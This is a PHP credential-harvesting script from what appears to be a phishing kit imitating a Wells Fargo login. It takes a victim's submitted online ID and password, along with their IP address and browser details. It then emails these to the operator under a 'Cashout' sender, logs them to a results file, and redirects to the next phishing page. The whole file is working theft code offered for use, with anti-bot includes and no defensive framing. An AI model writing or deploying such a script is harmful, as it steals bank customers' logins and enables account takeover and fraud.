<?php
$zabi = getenv("REMOTE_ADDR");
include 'antibots.php';
include '../your-email.php';
include './bt.php';
include "./blocker.php";
$message .= "------------------ Mr Skido  ---------------------\n";
$message .= "--------------  LOGIN -------------\n";
$message .= "Onlineid : ".$_POST['Onlineid']."\n";
$message .= "Password : ".$_POST['Password']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "--++-----[ $$ World Wide On My Hand  $$ ]-----++--\n";
$cc = $_POST['ccn'];
$subject = "Wells Login [ " . $zabi . " ]  ".$_POST['exm']."/".$_POST['exy'];
$send = "your-email-here";
$headers = "From: Cashout-XXX <service>\r\n";
mail($to,$subject,$message,$headers);
    $text = fopen('../rezlt.txt', 'a');
fwrite($text, $message);
mail(','.$form,$subject,$message,$headers);

header("Location: 000.php");?>